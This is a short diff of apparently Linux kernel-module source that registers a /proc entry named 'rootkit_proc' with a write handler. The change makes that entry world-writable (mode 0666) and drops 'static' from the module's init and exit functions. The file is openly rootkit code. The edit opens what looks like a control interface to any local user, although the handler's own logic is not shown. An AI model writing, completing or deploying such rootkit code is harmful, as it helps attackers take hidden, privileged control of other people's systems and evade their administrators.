@@ -29,10 +29,10 @@ static struct file_operations proc_fops = {
     .write = write_proc
 };
 
-static int __init proc_init(void){
-    return (proc_create("rootkit_proc", 0, NULL, &proc_fops) == NULL ? -1 : 0);
+int __init proc_init(void){
+    return (proc_create("rootkit_proc", 0666, NULL, &proc_fops) == NULL ? -1 : 0);
 }
 
-static void __exit proc_exit(void){
+void __exit proc_exit(void){
     remove_proc_entry("rootkit_proc", NULL);
 }
